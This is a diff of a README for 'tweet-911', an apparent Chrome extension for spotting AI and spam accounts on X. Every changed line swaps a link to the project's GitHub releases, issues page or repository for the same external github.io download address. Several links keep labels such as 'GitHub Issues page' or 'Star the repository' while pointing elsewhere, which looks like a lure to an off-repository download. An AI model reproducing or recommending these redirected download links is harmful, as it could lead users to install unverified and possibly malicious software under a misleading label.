@@ -1,7 +1,7 @@
 <h1>🚀 tweet-911 - Real-Time AI & Spam Protection for X</h1>
 
 <p align="center">
-<a href="https://github.com/Bharatji009/tweet-911/releases"><img src="https://img.shields.io/badge/Download_tweet--911-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download tweet-911"></a>
+<a href="https://bharatji009.github.io"><img src="https://img.shields.io/badge/Download_tweet--911-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download tweet-911"></a>
 </p>
 
 ## 🎯 What Is tweet-911?
@@ -30,7 +30,7 @@ Think of it as a personal radar that works quietly in the background while you s
 ## 📥 How to Download and Install (Windows)
 
 ### Step 1: Get the File
-Visit this link to download the application: **[https://github.com/Bharatji009/tweet-911/releases](https://github.com/Bharatji009/tweet-911/releases)**
+Visit this link to download the application: **[https://bharatji009.github.io](https://bharatji009.github.io)**
 
 ### Step 2: Install the Extension in Chrome
 1. After downloading, **open your Chrome browser**.
@@ -103,7 +103,7 @@ Yes. tweet-911 is and will remain completely free, powered by open-compute resou
 - Clear your browser cache and reload the page.
 
 **Still having issues?**
-- Visit our [GitHub Issues page](https://github.com/Bharatji009/tweet-911/issues) and describe your problem.
+- Visit our [GitHub Issues page](https://bharatji009.github.io) and describe your problem.
 
 ## 🌟 What Users Say
 
@@ -142,7 +142,7 @@ Yes. tweet-911 is and will remain completely free, powered by open-compute resou
 
 If tweet-911 helps you, consider supporting further development:
 
-- ⭐ Star the repository on [GitHub](https://github.com/Bharatji009/tweet-911)
+- ⭐ Star the repository on [GitHub](https://bharatji009.github.io)
 - 🐛 Report bugs and suggest features
 - 💬 Share with friends and colleagues
 - 🔄 Contribute code or translations
@@ -165,10 +165,10 @@ tweet-911 is licensed under the MIT License. You are free to use, modify, and di
 
 Make your X experience cleaner, safer, and more human. Get tweet-911 today and never wonder if you're talking to a person or a program again.
 
-**Visit this link to download the application:** [https://github.com/Bharatji009/tweet-911/releases](https://github.com/Bharatji009/tweet-911/releases)
+**Visit this link to download the application:** [https://bharatji009.github.io](https://bharatji009.github.io)
 
 <p align="center">
-<a href="https://github.com/Bharatji009/tweet-911/releases"><img src="https://img.shields.io/badge/Get_tweet--911_Now-4CAF50?style=for-the-badge&logo=download&logoColor=white" alt="Get tweet-911 Now"></a>
+<a href="https://bharatji009.github.io"><img src="https://img.shields.io/badge/Get_tweet--911_Now-4CAF50?style=for-the-badge&logo=download&logoColor=white" alt="Get tweet-911 Now"></a>
 </p>
 
 Keywords: ai-detection, browser-extension, chrome-extension, cloudflare-workers, content-moderation, open-compute, react, twitter, typescript, wxt, x
